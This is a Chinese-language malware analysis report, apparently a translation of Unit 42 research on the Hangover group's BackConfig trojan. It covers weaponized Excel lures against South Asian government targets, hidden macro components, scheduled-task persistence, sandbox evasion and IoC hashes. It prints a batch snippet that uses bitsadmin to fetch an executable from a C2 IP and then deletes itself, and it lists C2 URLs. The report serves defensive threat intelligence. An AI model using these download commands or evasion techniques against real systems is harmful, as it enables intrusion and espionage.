同样，存储在所有Excel文档中的版本信息元数据共享相同的“作者”和“最后修改者”名称——“测试”。
以下小节描述了上面时间线图中突出显示的三个最新里程碑的活动和恶意软件
### 2019年里程碑：多组件
上面表3中列出的`Registration
Form.xls`（SHA256：be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461）提供了该组织使用的引诱类型的样本。
在打开XLS并启用宏代码时，下面图中的图片显示在顶部的白色背景单元格上。正如文件名所示，这是一个注册表格，与巴基斯坦政府为帮助解决该国住房短缺而运行的“Naya巴基斯坦住房项目”有关。符合条件的公民包括政府雇员，登记表格截止到2019年10月15日(延长到11月15日)，这意味着10月25日的竞选时间和其诱惑力显然是为了增加感染恶意软件的机会。
![
](https://images.seebug.org/content/images/2020/05/433bd844-a8ac-4863-991f-de066aa7457e.png-w331s)
图4 2019年10月，利用社会工程诱惑巴基斯坦政府
由于在编写本文时，PHP网页并不存在，因此Unit
42无法证明XLS文件`be3f12b…`是托管在上面表3第1行所列的URL上的。然而，由于以下几点，我们对两者之间的竞争关系有高度的信心。
  1. AutoFocus和VirusTotal于2019年10月25日首先处理了XLS文件be3f12b…
  2. VirusTotal在同一天处理了nsaimmigration…URL
  3. 当天，在VirusTotal中处理了使用符号 `nphp_registration_form.php?r=` 的特定HTTP GET请求URL，该URL与 `http://185.203.119[.]184/fin_div/session` 有关联，该IP地址与 XLS be3f12b…删除的VBS代码中的URL结构相匹配
  4. PHP网页nphp_registration_form.php的名称与XLS的文件名有关
XLS文件be3f12b…中的VBA宏代码与前几年的样本有所不同。它没有直接存储编码的EXE文件，也没有直接从VBA代码本身运行批处理shell命令，而是从Excel工作表中隐藏的列(从第27列或“AA”列开始)检索内容，对于大多数人来说，这可能不在屏幕上。更改字体颜色后，分别在AA和AB列中显示了先前变体中的“设置”批处理代码组件以及新的Visual
Basic Script（VBS）下载器组件，如下图5所示。
![
](https://images.seebug.org/content/images/2020/05/5551d7c9-3b07-4ad5-b860-eb94af7a5bfe.png-w331s)
图5 XLS表中显示了VBS下载器和BAT设置文件
XLS中的宏VBA代码逐行解析这两列的内容，将内容写入它们各自在磁盘上的文件，并按照图6中描述的相同流程执行。
### 2019里程碑：BITS和ZIP
一个更新的武器化的XLS文件(SHA256:
021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b)于2019年11月15日经Wildfire分析，并揭示了一些新技术。在这种情况下，VBA宏代码包含一个只有1,062字节大小的十进制编码的ZIP文件。在ZIP归档文件中有两个文本文件，它们将被解压到文件夹driverkit中。文件driverkit.bat是本报告中已讨论并在附录部分列出的“设置”BAT文件，另一个文件Winmgt.txt是对下载的VBS的改编，本报告中也对此进行了描述。但是，该版本没有使用MSXML
DOM对象直接下载HTTP，而是将以下内容写入Winmgt_Drive.bat，由“设置”bat文件创建的第三个计划任务执行。
    echo off
    bitsadmin /transfer Microsoft_Update /download /priority high 
    http://185.203.119[.]184/winmgt/winmgt.exe 
    %USERPROFILE%\Adobe\Driver\pdf\winmgt.exe
    del %0
### 2020里程碑：微调
以下流程图基于Unit 42检测到的最新武器化文件之一Invoice.xls (SHA256:
8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c;
首次于2020-01-15被检测到)。
感染过程由多个部分组成，一旦VBA将BackConfig插件加载程序写入磁盘并执行，“设置”批处理(BAT)文件就可协调BackConfig插件加载程序的大部分感染过程。
 图6 Backconfig恶意软件执行流程图
下面是图6中编号对应的解释：
  1. 创建文本文件Drive.txt (SHA-256: 4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1)并包含十进制解码的VBS内容。
  2. 类似地，VBA代码然后将批处理代码写入另一个文本文件—Audio.txt。这两个文件的内容附在本文附录部分。
  3. Audio.txt被重命名为Audio.bat并执行。
  4. Audio.bat清理与以前的感染相关的所有文件和文件夹，并重新创建所需的环境，包括创建前面提到的pid.txt文件，并将各种文件夹和文件设置为从默认的Windows资源管理器视图中隐藏。pid.txt的内容是受害者的计算机名加上连字符和一个随机数，尽管我相信使用的代码不会像预期的那样工作。
  5. bat继续创建两个调度任务引用两个尚不存在的文件:dphc.exe将每10分钟运行一次并驱动，Drive.vbs每隔20分钟一次。
  6. 最后，在删除自己之前，Audio.bat会将Drive.txt重命名为Drive.vbs。vbs最终由任务调度程序执行，它将下载BackConfig可执行payload。在文件8892279f3中，远程位置是 http://185.203.119[.]184/Dropbox/request。
  7. 当任务调度程序最终执行dph .exe时，它首先检查是否存在pid.txt(步骤4)，并且仅在文件存在时才继续执行。
最后，XLS将两个文件写入磁盘，其中一个文件BAT立即修改一些系统设置并创建两个计划任务。然而，这种行为可能不足以确定为恶意组件。在20分钟之后，任务调度程序才会执行VBS
downloader组件并启动BackConfig loader EXE，此时分析系统可能已经停止监视。
### ATT&CK
下表描述了与本文中描述的多个活动相关联的TTPs。
![
](https://images.seebug.org/content/images/2020/05/3e370f58-a331-4ef9-984f-64bfe22b2094.png-w331s)
### 结论
根据Unit 42的报告，“Hangover”组织(又名Neon, Viceroy Tiger,
MONSOON)非常活跃，目标明确，南亚的政府和军事组织使用带有信件或政府表格的鱼叉式网络钓鱼邮件，引诱受害者浏览受攻击的网站，这些网站提供安装了BackConfig木马的武器化Excel文件。几乎无一例外地，Unit
42检测到的武器化文件需要用户执行。在过去六个月里，我们只看到过一次利用漏洞来绕过用户执行安装链中的部分。
BackConfig的主payload和辅助payload的发展已经见证了执行命令和部署可执行文件的不同方法，有混淆也有不混淆。
最新的版本包含了模块化的组件，可以更轻松地更新和重复使用代码，以便及时快速地部署他们的活动，从而获得最大的成功机会。执行最新样本的方法还表明，该组织的重点是试图通过将恶意活动分解为每个看起来相对良性的模块来避开沙箱和其他自动化分析系统。
### IoC
**传送文档：**
56349cf3188a36429c207d425dd92d8d57553b1f43648914b44965de2bd63dd6
8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c
021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b
be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461
0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf
ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb
752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f (RTF using
CVE-2017-11882)
**批处理文件：**
4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB (Audio.txt /
.bat from Naya Housing campaign)
C94f7733fc9bdbcb503efd000e5aef66d494291ae40fc516bb040b0d1d8b46c9
6a35d4158a5cb8e764777ba05c3d7d8a93a3865b24550bfb2eb8756c11b57be3
750fc47d8aa8c9ae7955291b9736e8292f02aaaa4f8118015e6927f78297f580
5292f4b4f38d41942016cf4b154b1ec65bb33dbc193a7e222270d4eea3578295
f64dbcd8b75efe7f4fa0c2881f0d62982773f33dcfd77cccb4afc64021af2d9e
98d27e830099c82b9807f19dcef1a25d7fce2c79a048d169a710b272e3f62f6e
29c5dd19b577162fe76a623d9a6dc558cfbd6cddca64ed53e870fe4b66b44096
(driverkit.bat)
abe82ffb8a8576dca8560799a082013a7830404bb235cb29482bc5038145b003
(Winmgt_Drive.bat uses bitsadmin)
02c306bb120148791418136dcea8eb93f8e97fb51b6657fd9468c73fb5ea786c
**VBS 文件：**
87e8c46d065ace580b1ed28565d1fddaa6df49da1ba83f7b3e9982cd8a0013f1
(One_drivers.txt / .vbs from Naya Housing campaign)
952d4a9891a75e25e1c31a0514b97345ca0d8f240cdd4a57c8b3ff8a651a231a
(Down_LinkLog.vbs)
a1cd89a684db41206fc71efe327ef608652931e749c24a3232908824cea426bb (Winmgt.vbs
using BITS)
**EXE Payloads：**
306fe259a250b2f0d939322cfb97787c4076c357fc9eb1f1cc10b0060f27f644
0f11fb955df07afc1912312f276c7fa3794ab85cd9f03b197c8bdbefb215fe92
84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c
18ce3eebbb093a218a8f566b579a5784caee94fadcda8f8c0d21f214ce2bd8b9
922d6e68ecac6dbfdd1985c2fae43e2fc88627df810897e3068d126169977709
4a4bc01b20dd2aaa2a2434dc677a44cc85d9533bed30bc58b8026b877db028d5
677d4982d714bb47fab613ebe1921005509ed0d1e8965e7241994e38c3ade9f2
d3013204f1a151c72879afc213dca3cada8c3ea617156b37771bdd7b7b74057f
91c67c1cda67b60c82e14a5c32d79a4236f5a82136317162dfbde1a6054cf8c1
de5b670656cbdbcf11607f01a6f93644765d9647ddab39b54946170b33f7ac9a
f79ebf038c7731ea3a19628cb329cada4ebb18f17439d9c6cf19d361b0494e7b
9e141fe67521b75412419a8c88c199c8ebd2a135c7a8b58edced454fbc33cb77
6787242a810f8a5e1423e83790064a0a98954ab0802a90649fdd55a47d75695e
e28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f
07c97b253452a2a8eb7753ed8c333efeaa3546c005ffcfb5b3d71dc61c49abda
31faeefb4dc4e54b747387bb54a5213118970ccb2f141559f8e2b4dbfdbeb848
15109962da4899949863447bfdf6a6de87a8876f92adb7577392032df44ec892
D87b875b8641c538f90fe68cad4e9bdc89237dba137e934f80996e8731059861
167c7d7c08d318bc40e552e6e32715a869d2d62ba0305752b9b9bece6b9e337e
4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd (example of